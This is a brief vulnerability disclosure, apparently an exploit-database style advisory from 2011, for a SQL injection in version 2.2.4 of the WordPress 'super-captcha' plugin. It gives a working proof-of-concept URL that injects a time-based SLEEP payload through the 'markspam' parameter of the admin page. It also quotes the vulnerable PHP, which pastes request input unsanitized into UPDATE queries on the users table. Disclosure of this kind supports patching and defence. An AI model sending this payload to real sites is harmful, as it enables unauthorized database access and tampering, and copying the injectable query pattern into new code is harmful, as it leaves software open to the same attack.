# Date: 2011-08-26
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 2.2.4 (tested)
# Notes: user has to be logged in as "admin" and magic_quotes has to be turned off
 
---
PoC
---
http://www.site.com/wp-admin/admin.php?page=super-captcha/Logs&markspam=-1&#039; OR SLEEP(5)--%20
 
---------------
Vulnerable code
---------------
if(isset($_REQUEST[&#039;markspam&#039;]))
    {
    global $wpdb;
    $UIDs = explode(&#039;,&#039;, $_REQUEST[&#039;markspam&#039;]);
    echo(&#039;<h2>Accounts Flagged</h2>&#039;);
    for($i=0;$i<count($UIDs);$i++)
        {
        mysql_query("UPDATE `". $wpdb->users ."` SET `spam`=&#039;1&#039; WHERE `ID`=&#039;". $UIDs[$i] ."&#039;");
        mysql_query("UPDATE `". $wpdb->users ."` SET `user_status`=&#039;1&#039; WHERE `ID`=&#039;". $UIDs[$i] ."&#039;");
        echo(&#039;<em>USER ID: &#039;. $UIDs[$i] .&#039; marked as spammer.</em><br />&#039;);
        }
    }



